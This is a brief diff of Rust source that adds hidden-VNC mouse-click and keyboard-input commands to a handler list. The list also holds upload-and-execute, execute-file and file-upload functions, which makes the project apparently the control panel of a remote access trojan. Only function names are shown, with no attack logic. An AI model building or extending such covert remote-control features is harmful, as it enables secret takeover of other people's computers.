@@ -50,6 +50,8 @@ async fn main() {
             read_icon,
             read_exe,
             manage_hvnc,
+            send_hvnc_mouse_click,
+            send_hvnc_keyboard_input,
             upload_and_execute,
             execute_file,
             read_file_for_upload,
